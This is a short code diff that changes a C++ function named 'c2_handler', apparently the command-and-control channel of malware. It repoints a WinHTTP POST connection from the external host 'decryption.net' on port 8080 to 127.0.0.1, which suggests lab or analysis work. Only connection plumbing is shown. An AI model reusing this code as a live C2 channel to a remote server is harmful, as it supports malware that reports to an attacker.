@@ -14,7 +14,7 @@ boolean c2_handler(std::vector<BYTE>& outputData, const std::vector<BYTE>& input
         WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return false;
 
-    HINTERNET hConnect = WinHttpConnect(hSession, L"decryption.net",
+    HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1",
         8080, 0);
     if (!hConnect) {
         WinHttpCloseHandle(hSession);
@@ -25,7 +25,7 @@ boolean c2_handler(std::vector<BYTE>& outputData, const std::vector<BYTE>& input
         hConnect, L"POST", endpoint.c_str(),
         NULL, WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
-        0); 
+        0);
     if (!hRequest) {
         WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hSession);
